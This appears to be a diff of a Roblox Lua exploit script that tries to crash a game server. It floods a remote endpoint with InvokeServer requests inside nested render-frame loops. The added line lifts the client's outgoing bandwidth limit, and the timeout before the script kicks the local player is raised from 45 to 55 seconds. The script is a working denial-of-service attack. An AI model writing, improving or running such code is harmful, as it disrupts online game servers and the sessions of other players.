@@ -906,6 +906,7 @@ wait(1)
 	game:GetService('RunService').RenderStepped:Connect(function()
 		for i = 1, 6500 do
 			for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
+				spawn(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge) end)
 				pcall(function()
 					game:GetService("ReplicatedStorage").Settings:InvokeServer('Get')
 				end)    
@@ -913,9 +914,9 @@ wait(1)
 		end
 	end)
 
-	wait(45)
-	printconsole('Client did not crash server within 45 seconds of Get Request.')
-	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 45 seconds of last Get Request')
+	wait(55)
+	printconsole('Client did not crash server within 55 seconds of Get Request.')
+	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 55 seconds of last Get Request')
 
 end
 C.BasicSetup()
